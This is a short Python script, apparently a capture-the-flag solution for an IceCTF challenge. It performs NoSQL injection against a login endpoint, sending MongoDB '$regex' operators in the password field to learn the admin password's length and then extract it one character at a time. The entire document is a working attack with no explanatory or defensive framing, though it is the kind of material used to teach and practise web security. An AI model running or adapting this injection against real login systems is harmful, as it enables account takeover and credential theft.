#!/usr/python

import requests
import json

url = "http://chainedin.vuln.icec.tf/login"

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}_"

print "[+] Getting password size ..."
for i in range(7, 100):
	payload = {'user':'admin','pass':{'$regex':'.{'+str(i)+'}'}}
	r = requests.post(url, json=payload)
	if "Invalid" in r.text:
		print "[+] Password size is "+str(i-1)
		size = i
		break

print "[+] Getting password"
password = "IceCTF{"
for i in range(7, size+1):
	for c in charset:
		payload = {'user':'admin','pass':{'$regex':password+c}}
		r = requests.post(url, json=payload)
		if "Administrator" in r.text:
			password = password + c
			print password
			continue
